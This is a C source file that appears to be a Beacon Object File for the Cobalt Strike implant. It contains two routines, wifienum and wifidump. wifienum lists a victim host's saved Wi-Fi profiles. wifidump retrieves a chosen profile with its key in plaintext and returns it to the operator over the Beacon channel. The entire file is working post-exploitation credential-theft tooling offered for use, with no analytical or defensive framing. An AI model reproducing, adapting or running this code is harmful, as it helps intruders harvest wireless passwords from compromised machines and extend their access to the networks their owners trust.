#ifndef UNICODE
#define UNICODE
#endif
#include <windows.h>
#include <wlanapi.h>
#include <objbase.h>
#include <wtypes.h>
#include <stdio.h>
#include <stdlib.h>
#include "beacon.h"
#define WLAN_PROFILE_GET_PLAINTEXT_KEY 4
#define WLAN_PROFILE_GROUP_POLICY                   0x00000001
#define WLAN_READ_ACCESS    ( STANDARD_RIGHTS_READ | FILE_READ_DATA )
#define WLAN_EXECUTE_ACCESS ( WLAN_READ_ACCESS | STANDARD_RIGHTS_EXECUTE | FILE_EXECUTE )
#define WLAN_WRITE_ACCESS   ( WLAN_READ_ACCESS | WLAN_EXECUTE_ACCESS | STANDARD_RIGHTS_WRITE | FILE_WRITE_DATA | DELETE | WRITE_DAC )

DECLSPEC_IMPORT DWORD WINAPI WLANAPI$WlanOpenHandle(DWORD,PVOID,PDWORD,PHANDLE);
DECLSPEC_IMPORT DWORD WINAPI WLANAPI$WlanEnumInterfaces(HANDLE,PVOID,PWLAN_INTERFACE_INFO_LIST*);
DECLSPEC_IMPORT INT WINAPI OLE32$StringFromGUID2(REFGUID, LPOLESTR, INT);
DECLSPEC_IMPORT DWORD WINAPI WLANAPI$WlanGetProfile(HANDLE,const GUID*,LPCWSTR,PVOID,LPWSTR*,DWORD*,DWORD*);
DECLSPEC_IMPORT VOID WINAPI WLANAPI$WlanFreeMemory(PVOID);
DECLSPEC_IMPORT DWORD WINAPI WLANAPI$WlanGetProfileList(HANDLE, const GUID*, PVOID, PWLAN_PROFILE_INFO_LIST*);

void wifidump(IN PCHAR Buffer, 
	IN ULONG Length)  
	{
        // Parse Beacon Arguments
        datap parser;
        wchar_t * pProfileName;
        BeaconDataParse(&parser, Buffer, Length);
        pProfileName = (wchar_t *)BeaconDataExtract(&parser, NULL);
        
        //Declare variables
        HANDLE hClient = NULL;
        DWORD dwMaxClient = 2;      //    
        DWORD dwCurVersion = 0;
        DWORD dwResult = 0;
        DWORD dwRetVal = 0;
        int iRet = 0;
        WCHAR GuidString[39] = {0};
        unsigned int i;
        PWLAN_INTERFACE_INFO_LIST pIfList = NULL;
        PWLAN_INTERFACE_INFO pIfInfo = NULL;
        LPWSTR pProfileXml = NULL;
        DWORD dwFlags = 0;
        DWORD dwGrantedAccess = 0;

        //Open handle on wifi interface
        dwResult = WLANAPI$WlanOpenHandle(dwMaxClient, NULL, &dwCurVersion, &hClient);
        if (dwResult != ERROR_SUCCESS) {
            BeaconPrintf(CALLBACK_OUTPUT,"WlanOpenHandle failed with error: %u\n", dwResult);
        }
        dwResult = WLANAPI$WlanEnumInterfaces(hClient, NULL, &pIfList);
        if (dwResult != ERROR_SUCCESS) {
            BeaconPrintf(CALLBACK_OUTPUT,"WlanEnumInterfaces failed with error: %u\n", dwResult);
        } else {
            for (i = 0; i < (int) pIfList->dwNumberOfItems; i++) {
                pIfInfo = (WLAN_INTERFACE_INFO *) &pIfList->InterfaceInfo[i];               
                iRet = OLE32$StringFromGUID2(&pIfInfo->InterfaceGuid, (LPOLESTR) &GuidString, 
                    sizeof(GuidString)/sizeof(*GuidString)); 
                dwFlags = WLAN_PROFILE_GET_PLAINTEXT_KEY;
                dwResult = WLANAPI$WlanGetProfile(hClient,
                                                &pIfInfo->InterfaceGuid,
                                                pProfileName,
                                                NULL, 
                                                &pProfileXml,
                                                &dwFlags,
                                                &dwGrantedAccess);                                  
                if (dwResult != ERROR_SUCCESS) {
                    BeaconPrintf(CALLBACK_OUTPUT,"WlanGetProfile failed with error: %u\n",
                        dwResult);
                } else {
                    BeaconPrintf(CALLBACK_OUTPUT,"Profile XML string: %ws\n", pProfileXml);
                }
            }
        }
        if (pProfileXml != NULL) {
            WLANAPI$WlanFreeMemory(pProfileXml);
            pProfileXml = NULL;
        }
        if (pIfList != NULL) {
            WLANAPI$WlanFreeMemory(pIfList);
            pIfList = NULL;
        }
    }
void wifienum(IN PCHAR Buffer, 
	IN ULONG Length)  
	{
        HANDLE hClient = NULL;
        DWORD dwMaxClient = 2;      //    
        DWORD dwCurVersion = 0;
        DWORD dwResult = 0;
        DWORD dwRetVal = 0;
        int iRet = 0;      
        WCHAR GuidString[39] = {0};
        unsigned int i, j;

        PWLAN_INTERFACE_INFO_LIST pIfList = NULL;
        PWLAN_INTERFACE_INFO pIfInfo = NULL;

        PWLAN_PROFILE_INFO_LIST pProfileList = NULL;
        PWLAN_PROFILE_INFO pProfile = NULL;

        dwResult = WLANAPI$WlanOpenHandle(dwMaxClient, NULL, &dwCurVersion, &hClient);
        if (dwResult != ERROR_SUCCESS) {
            BeaconPrintf(CALLBACK_OUTPUT, "WlanOpenHandle failed with error: %u\n", dwResult);
        }

        dwResult = WLANAPI$WlanEnumInterfaces(hClient, NULL, &pIfList);
        if (dwResult != ERROR_SUCCESS) {
            BeaconPrintf(CALLBACK_OUTPUT, "WlanEnumInterfaces failed with error: %u\n", dwResult);
        } else {
   
            for (i = 0; i < (int) pIfList->dwNumberOfItems; i++) {
                pIfInfo = (WLAN_INTERFACE_INFO *) &pIfList->InterfaceInfo[i];
                dwResult = WLANAPI$WlanGetProfileList(hClient,
                                                &pIfInfo->InterfaceGuid,
                                                NULL, 
                                                &pProfileList);
                if (dwResult != ERROR_SUCCESS) {
                    BeaconPrintf(CALLBACK_OUTPUT, "WlanGetProfileList failed with error: %u\n",
                            dwResult);
                    dwRetVal = 1;
                } else {

                    for (j = 0; j < pProfileList->dwNumberOfItems; j++) {
                        pProfile =
                            (WLAN_PROFILE_INFO *) & pProfileList->ProfileInfo[j];
                        BeaconPrintf(CALLBACK_OUTPUT, "  Profile Name[%u]:  %ws\n", j, pProfile->strProfileName);
                        
                    }
                }
            }
        }
        if (pProfileList != NULL) {
            WLANAPI$WlanFreeMemory(pProfileList);
            pProfileList = NULL;
        }

        if (pIfList != NULL) {
            WLANAPI$WlanFreeMemory(pIfList);
            pIfList = NULL;
        }   
}